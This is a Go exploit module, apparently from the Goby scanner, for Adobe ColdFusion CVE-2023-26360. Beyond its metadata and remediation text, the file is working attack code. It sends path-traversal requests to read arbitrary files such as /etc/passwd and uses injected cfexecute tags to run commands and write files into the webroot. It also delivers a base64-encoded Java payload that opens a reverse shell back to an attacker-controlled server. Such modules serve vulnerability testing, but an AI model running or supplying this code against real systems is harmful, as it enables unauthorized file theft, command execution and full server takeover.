package exploits

import (
	"archive/zip"
	"bytes"
	"encoding/base64"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"io"
	"math/rand"
	"net/url"
	"regexp"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Adobe ColdFusion /filemanager/iedit.cfc Unauthorized Access Vulnerability (CVE-2023-26360)",
    "Description": "<p>Adobe ColdFusion is a server-side programming language and development platform for building dynamic web applications. The main goal of ColdFusion is to simplify the web application development process by providing a powerful and easy-to-use platform that enables developers to quickly build feature-rich web applications.</p><p>An attacker can remotely read arbitrary files on the server without authorization, execute code, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "Adobe-ColdFusion",
    "Homepage": "https://www.adobe.com/",
    "DisclosureDate": "2024-01-23",
    "PostTime": "2024-06-20",
    "Author": "mayuze@baimaohui.net",
    "FofaQuery": "body=\"/cfajax/\" || header=\"CFTOKEN\" || banner=\"CFTOKEN\" || body=\"ColdFusion.Ajax\" || body=\"<cfscript>\" || server=\"ColdFusion\" || title=\"ColdFusion\" || (body=\"crossdomain.xml\" && body=\"CFIDE\") || (body=\"#000808\" && body=\"#e7e7e7\")",
    "GobyQuery": "body=\"/cfajax/\" || header=\"CFTOKEN\" || banner=\"CFTOKEN\" || body=\"ColdFusion.Ajax\" || body=\"<cfscript>\" || server=\"ColdFusion\" || title=\"ColdFusion\" || (body=\"crossdomain.xml\" && body=\"CFIDE\") || (body=\"#000808\" && body=\"#e7e7e7\")",
    "Level": "3",
    "Impact": "<p>An attacker can remotely read arbitrary files on the server without authorization, execute code, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>1. The vulnerability has been officially fixed. Users are asked to contact the manufacturer to fix the vulnerability: <a href=\"https://www.adobe.com\">https://www.adobe.com</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [
        "https://shfsec.com/cve-analysis-adobe-coldfusion-from-lfi-to-rce-cve-2023-26359-cve-2023-26360"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "readFile,cmd,reverse",
            "show": ""
        },
        {
            "name": "readFile",
            "type": "input",
            "value": "/etc/passwd",
            "show": "attackType=readFile"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        "CVE-2023-26360"
    ],
    "CNNVD": [
        "CNNVD-202303-1239"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.6",
    "Translation": {
        "CN": {
            "Name": "Adobe ColdFusion /filemanager/iedit.cfc 未授权访问漏洞 （CVE-2023-26360）",
            "Product": "Adobe-ColdFusion",
            "Description": "<p>Adobe ColdFusion是一种用于构建动态Web应用程序的服务器端编程语言和开发平台。ColdFusion的主要目标是简化Web应用程序的开发过程，通过提供一个强大且易于使用的平台，使开发人员能够快速构建功能丰富的Web应用。</p><p>攻击者可通过远程且未经过授权认证在服务器端读取任意文件，执行执行代码，写入后门，获取服务器权限，进而控制整个web服务器。</p>",
            "Recommendation": "<p>1、官方已修复该漏洞，请用户联系厂商修复漏洞：<a href=\"https://www.adobe.com\">https://www.adobe.com</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过远程且未经过授权认证在服务器端读取任意文件，执行执行代码，写入后门，获取服务器权限，进而控制整个web服务器。<br><br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Adobe ColdFusion /filemanager/iedit.cfc Unauthorized Access Vulnerability (CVE-2023-26360)",
            "Product": "Adobe-ColdFusion",
            "Description": "<p>Adobe ColdFusion is a server-side programming language and development platform for building dynamic web applications. The main goal of ColdFusion is to simplify the web application development process by providing a powerful and easy-to-use platform that enables developers to quickly build feature-rich web applications.</p><p>An attacker can remotely read arbitrary files on the server without authorization, execute code, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>1. The vulnerability has been officially fixed. Users are asked to contact the manufacturer to fix the vulnerability: <a href=\"https://www.adobe.com\">https://www.adobe.com</a></p><p>2. Set access policies through security devices such as firewalls and set whitelist access.</p><p>3. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>An attacker can remotely read arbitrary files on the server without authorization, execute code, write backdoors, obtain server permissions, and then control the entire web server.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocGlobalParams": {},
    "ExpGlobalParams": {},
    "PocId": "10962"
}`

	payloadRequestEwrKWeWR6y := func(hostInfo *httpclient.FixUrl, data string) (*httpclient.HttpResponse, error) {
		// 多个/权限绕过
		payloadRequestConfig := httpclient.NewPostRequestConfig("//cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=zfgea&_cfclient=true")
		payloadRequestConfig.VerifyTls = false
		payloadRequestConfig.FollowRedirect = false
		payloadRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		payloadRequestConfig.Data = `_variables=` + data
		resp, err := httpclient.DoHttpRequest(hostInfo, payloadRequestConfig)
		if err != nil {
			return nil, err
		}
		if len(resp.Utf8Html) == 0 {
			return nil, errors.New("Response Not Found")
		}
		return resp, nil
	}

	// 反弹
	bounceShellEwrKWeWR6y := func(hostInfo *httpclient.FixUrl, host, port string) error {
		structureLoadClass := func(host, port string) []byte {
			updateZipFile := func(zipReader *zip.Reader, file *zip.File, newContent []byte) []byte {
				var updatedZipBuffer bytes.Buffer
				zipWriter := zip.NewWriter(&updatedZipBuffer)
				for _, originalFile := range zipReader.File {
					if originalFile.Name == file.Name {
						writer, _ := zipWriter.Create(originalFile.Name)
						_, err := writer.Write(newContent)
						if err != nil {
							return nil
						}
					} else {
						writer, _ := zipWriter.Create(originalFile.Name)
						originalReader, _ := originalFile.Open()
						_, err := io.Copy(writer, originalReader)
						err = originalReader.Close()
						if err != nil {
							return nil
						}
					}
				}
				err := zipWriter.Close()
				if err != nil {
					return nil
				}
				updatedZipContent := updatedZipBuffer.Bytes()
				fmt.Println(updatedZipContent)
				return updatedZipContent
			}
			base64EncodedZip := "UEsDBBQAAAAAACVdQlgAAAAAAAAAAAAAAAAFAAAAY29kZS9QSwMEFAACAAgAFlxCWIHQDo9LBgAA0goAABIAAABjb2RlL1BheWxvYWQuY2xhc3OFVvl3E1UU/qYkmckw0JKGQoCWogJtaRtlEY2oYAGtpottpRZUnCZDO5DOxJkJpe6IO7hviOCurQsKCGmRo+IveI5/jL/r8Vi/N0lpKuXYNPfdue++u333vsnv//z4M4D1+FHFBnSHEUSPivuwQ3C9Mu5X0KdiJ3bJeECFgm5BHlTxEHbLeFiFBl3BRiHsV3CzykPd4nhKcGkZhooo9ggyoGBQhYl+FXuxT0FGrEMKLAW2iiweEcSR4Yrjnopa5FTsx7AgB8Sjz40IziePihgeE+RxFU/gSUGeCqLwt1Z4fFocOCjjGbEeEmd2q7gBz8p4TsbzEsrMrIRIcq++X49ndGsg3u05pjVwi4RA1nY8CZUle62WZwwYDjdDm0zL9G6TMKeufgd1W+y0IaE8aVpGe26o33B69P4MJZpreK3ZLVa60zdWVXelp1bfwJBuWmJ/15UKYn9et6en9rXpWd+ujBdkvCjjJeJBAGS8zECcnCXjMMGScYQVlPEKs5agdts5J2VsN/1wOvWRjK2nm4UTDbdgk4aNuEnGqxpew+sabkaCWilmEy+qSlAGbddrTusefWp4A29KiPpB5jwzE+907KzheKbhangLbzMoDe9gEwvn65h2vLVj24GUkfVM29LwrnD5Ho5qeB/HNNyOzRIqplPuGXQMPS0i+0DDcWFGtt1mSx9izieYnoYP8RGTHTZp62N8wv14v2nF3UFyqaF0s3GAmp9q+Ayfa/gCXxIU37plePFuO7XP8DSMYkx42MxCafgKX2v4RpBvcVLDd/hewymhcBpjrKGGM/hBw1kR9jnkNYxjbCo3P+KS3CaE0nkRX0lGHf17jRShj0yLunKWVWiPyl2zdV75tKwlo7tuaS2tbM6joqEPzYiCdbOHCzYr/mtRwoJpEeFKGcJkdMpkR84rsbngim5nYffrmZzRsUf0Z2v9rPNQOWB4XYbrt9oWd8pY/SztXjw/MxcxboVmW1w3676YgWAqY7tiyrI05PkD0ePoKUrm0nuxD0ckrLq615l1VrK64xpMQsLC2c60SlhUKp/CrRCN6+lipEvLPeJ6BtOe69lJe9hwWnQRbrRuducp2/I49IRiaamTlkHd6TYeyRlWio52zkCEAXjmEG2qotxTDwtnOCiKRUU5CykJq/+nHMWOECGxrDsE1P61xuzn082MjltUdzX4hOo2x7GdKdVyCma21uKSw6U7vme3RYCb9j0z6TD1zEyhoQPiSmDBhx3TE491/o0Z3JPJiakPuhnDyArx3UIcNg6YU0nIacP1HHukUK82JqkPGFjBl9IGSLgRZfzw9uOrokxcfFwDlPNSJL2VT9VcJa7BhnFIp8lIuI005AtVUt5eRdVmmpjDdX7DmnMoa1g2gTnnEJg+M9/fLafrCszDAoSxBXcUzkrHuadw95VIMLkmEspDbmu8hIMXoPSNI9ze1JiHyu/cUdyUCMQCecwbRXORK8hrL8urEsGCSE2EYjQ1Lxb8pSkyP4/yRKApUiHW4AUEaXiBUIgFYsEJRPKovIBoXyw0joUJOSbnUXUaMpZiOa7hy72KXCPXdaxWovi8lQE3UiLW7bgbbZRvJbfVr6ZI+VHUkFYyuSiLtZAlqOJnMc9W024tLdfgOnL1RKQRMZZwCe1V00ctvdQQheUs0gpaXEa71fRRSy816KC8h/JeWtiNazFAK1msxONYhRewGkdosYWet0GZpEpAxlYZ22Rsl3EnJBl3tfLbVlhbJ1n50AwNCn2t0J8o+4s/iSQ6LjaE9BEbRKXp3yKLJrA4j1hkSR5LjyEcWZYcRShSnZxAzZo8lrddQG1fw1l2wlkQmBXjuKaduFybCJBelwg25bEyESK/KiGTX51QSOuOYbeAsf5DVMQUwTXksWZ08o9Y8LIwOC0MFYWy4KaESh6NAr/GKJomEKeH63tHoSTCo5Mf82Et3awbRTjJINf3niZSYzjJ190NTOonXORawM4iSkATm7WZmF1PdNay4utYjvXEYgO6OD19RErn9FhEaz+n5hBLdJinj3IoThC5T9ngY0TvJJE4xVNnWNxzLO55FvQnInkR9+BXJHEJ7T5ed2Bu1d8ok3HPJK2GZSTJyiBS7T40hf8O/nMEo9Eof5d2BibFHFJVkM4gYbrX77+ufwFQSwMEFAAAAAAA91tCWGfJZEoZAAAAGQAAAA0AAABjb2RlL2hvc3QuZGF0aXA9MTcyLjE2LjMwLjQ0CnBvcnQ9NDQ0NFBLAQI/AxQAAAAAACVdQlgAAAAAAAAAAAAAAAAFAAAAAAAAAAAAAADtQQAAAABjb2RlL1BLAQI/AxQAAgAIABZcQliB0A6PSwYAANIKAAASAAAAAAAAAAAAAACkgSMAAABjb2RlL1BheWxvYWQuY2xhc3NQSwECPwMUAAAAAAD3W0JYZ8lkShkAAAAZAAAADQAAAAAAAAAAAAAApIGeBgAAY29kZS9ob3N0LmRhdFBLBQYAAAAAAwADAK4AAADiBgAAAAA="
			decodedZip, _ := base64.StdEncoding.DecodeString(base64EncodedZip)
			zipReader, _ := zip.NewReader(bytes.NewReader(decodedZip), int64(len(decodedZip)))
			updatedZipContent := []byte("")
			var modifiedContent []byte
			for _, file := range zipReader.File {
				if file.Name != "code/host.dat" {
					continue
				}
				modifiedContent = []byte("ip=" + host + "\nport=" + port + "\n")
				updatedZipContent = updateZipFile(zipReader, file, modifiedContent)
				break
			}
			return updatedZipContent
		}
		randomString321adas := func(size int) string {
			alpha := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
			var buffer bytes.Buffer
			for i := 0; i < size; i++ {
				buffer.WriteByte(alpha[rand.Intn(len(alpha))])
			}
			return buffer.String()
		}
		loadClass := structureLoadClass(host, port)
		err := godclient.HostFile(randomString321adas(8), string(loadClass), func(fileURL string) error {
			fileURL = strings.ReplaceAll(fileURL, "https://", "http://")
			if _, err := payloadRequestEwrKWeWR6y(hostInfo, `%7b%3ccftry%3e%3ccfset%20szlh%20%3d%20createObject%28%27java%27%2c%27java.net.URL%27%29.init%28%27`+fileURL+`%27%29/%3e%3ccfset%20cafb%20%3d%20createObject%28%27java%27%2c%27java.lang.reflect.Array%27%29/%3e%3ccfset%20ireh%20%3d%20cafb.newInstance%28szlh.getClass%28%29%2c1%29/%3e%3ccfset%20cafb.set%28ireh%2c0%2cszlh%29/%3e%3ccfset%20fxlt%20%3d%20createObject%28%27java%27%2c%27java.net.URLClassLoader%27%29.init%28ireh%2cjavaCast%28%27null%27%2c%27%27%29%29/%3e%3ccfset%20fxlt.loadClass%28%27code.Payload%27%29.newInstance%28%29.main%28javaCast%28%27null%27%2c%27%27%29%29/%3e%3ccfcatch%20type%3d%27any%27%3e%3c/cfcatch%3e%3ccffinally%3e%3ccffile%20action%3d%27write%27%20file%3d%27%23GetCurrentTemplatePath%28%29%23%27%20output%3d%27%27%3e%3c/cffile%3e%3c/cffinally%3e%3c/cftry%3e`); err != nil {
				return err
			} else if _, err = payloadRequestEwrKWeWR6y(hostInfo, `%7b%22_metadata%22%3a%7b%22classname%22%3a%22l/../logs/coldfusion-out.log%22%7d%2c%22_variables%22%3a%5b%5d%7d`); err != nil {
				return err
			}
			return nil
		})
		return err
	}
	// 命令执行
	commandExecutionrbIqljNz4u2EwrKWeWR6yS := func(hostInfo *httpclient.FixUrl, cmd string) (string, error) {
		fileName := goutils.RandomHexString(8)
		_, err := payloadRequestEwrKWeWR6y(hostInfo, `<cfexecute name='`+cmd+`' outputFile='../../../../../wwwroot/cf_scripts/`+fileName+`' ></cfexecute>`)
		if err != nil {
			return "", err
		} else if _, err = payloadRequestEwrKWeWR6y(hostInfo, `%7b%22_metadata%22%3a%7b%22classname%22%3a%22l/../logs/coldfusion-out.log%22%7d%2c%22_variables%22%3a%5b%5d%7d`); err != nil {
			return "", err
		}
		// 多个/权限绕过
		getResultsRequestConfig := httpclient.NewPostRequestConfig("//cf_scripts/" + fileName)
		getResultsRequestConfig.VerifyTls = false
		getResultsRequestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, getResultsRequestConfig)
		if err != nil {
			return "", err
		} else if resp.StatusCode == 200 && len(resp.Utf8Html) > 1 {
			return resp.Utf8Html, nil
		}
		return "", errors.New("漏洞利用失败")
	}
	// 读取文件
	fileReadingIqljNz4u2EwrKWeWR6yS := func(hostInfo *httpclient.FixUrl, fileName string) (string, error) {
		resp, err := payloadRequestEwrKWeWR6y(hostInfo, `{"_metadata":{"classname":"../../../../../../../../../../../..`+fileName+`"}}`)
		if err != nil {
			return "", err
		}
		if len(resp.Utf8Html) == 0 {
			return "", errors.New("not response")
		}
		if !strings.Contains(resp.Utf8Html, `<!-- " ---></TD></TD></TD></TH></TH></TH>`) {
			return "", errors.New("not info")
		}
		return resp.Utf8Html, nil
	}
	// 漏洞是否存在
	vulnerabilityCheckKWeWR6yS := func(hostInfo *httpclient.FixUrl) bool {
		// 针对windows和linux有回显通用判断
		resp, err := fileReadingIqljNz4u2EwrKWeWR6yS(hostInfo, `{"_metadata":{"classname":"../lib/neo-security.xml","_variables":[]}}`)
		if err != nil {
			return false
		}
		if strings.Contains(resp, `name='admin.security.enabled'`) {
			return true
			// 针对有回显linux启动位置路径会有不同判断
		}
		resp1, err := payloadRequestEwrKWeWR6y(hostInfo, `{"_metadata":{"classname":"../../../../../../../../../../../../etc/passwd","_variables":[]}}`)
		if err != nil {
			return false
		}
		if strings.Contains(resp1.Utf8Html, `root:x:0:0`) {
			return true
		}
		filename := goutils.RandomHexString(6) + ".txt"
		content := goutils.RandomHexString(12)
		// 针对windows和linux无回显判断
		fileUploadRequestConfig := httpclient.NewGetRequestConfig("//cf_scripts/" + filename)
		fileUploadRequestConfig.VerifyTls = false
		fileUploadRequestConfig.FollowRedirect = false
		_, err = payloadRequestEwrKWeWR6y(hostInfo, `<cfscript>fileWrite('../../../../../wwwroot/cf_scripts/`+filename+`','`+content+`');</cfscript>`)
		if err != nil {
			return false
		}
		_, err = payloadRequestEwrKWeWR6y(hostInfo, `%7b%22_metadata%22%3a%7b%22classname%22%3a%22l/../logs/coldfusion-out.log%22%7d%2c%22_variables%22%3a%5b%5d%7d`)
		if err != nil {
			return false
		}
		if resp, _ := httpclient.DoHttpRequest(hostInfo, fileUploadRequestConfig); strings.Contains(resp.Utf8Html, content) {
			return true
		}
		return false
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			return vulnerabilityCheckKWeWR6yS(hostinfo)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := stepLogs.Params["attackType"].(string)
			//attackType := "cmd"
			if attackType == "readFile" {
				resp, err := fileReadingIqljNz4u2EwrKWeWR6yS(expResult.HostInfo, goutils.B2S(stepLogs.Params["readFile"]))
				if err != nil {
					expResult.Output = err.Error()
					expResult.Success = false
				} else if match := regexp.MustCompile(`(.|\n)*?<!-- " ---></TD></TD></TD></TH></TH></TH>`).FindString(resp); len(match) > 1 {
					expResult.Output = strings.ReplaceAll(match, `<!-- " ---></TD></TD></TD></TH></TH></TH>`, ``)
					expResult.Success = true
				} else {
					expResult.Output = "漏洞利用失败"
					expResult.Success = false
				}
			} else if attackType == "cmd" {
				if resp, err := commandExecutionrbIqljNz4u2EwrKWeWR6yS(expResult.HostInfo, goutils.B2S(stepLogs.Params["cmd"])); len(resp) > 0 {
					expResult.Output = resp
					expResult.Success = true
				} else if err != nil {
					expResult.Output = err.Error()
				} else {
					expResult.Output = `漏洞利用失败`
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				err = bounceShellEwrKWeWR6y(expResult.HostInfo, godclient.GetGodServerHost(), rp)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						return expResult
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
				}
			}
			return expResult
		},
	))
}
